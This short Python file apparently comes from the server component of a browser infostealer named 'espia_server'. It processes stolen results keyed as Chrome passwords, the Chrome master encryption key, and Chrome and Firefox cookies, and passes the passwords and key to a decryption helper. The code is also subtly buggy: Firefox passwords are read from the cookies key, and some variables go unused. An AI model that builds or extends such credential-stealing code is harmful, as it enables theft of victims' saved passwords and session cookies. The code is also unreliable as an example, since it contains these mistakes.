from espia_server.app.browsers.chrome.chrome_utils import handle_chrome_passwords


def handle_products_results(results: dict) -> None:
    chrome_passwords = results.get("Chrome-Passwords")
    master_key = results.get("MasterKey")
    handle_chrome_passwords(chrome_passwords, master_key)
    chrome_cookies = results.get("Chrome-Cookies")
    firefox_passwords = results.get("Firefox-Cookies")
    firefox_cookies = results.get("Firefox-Cookies")
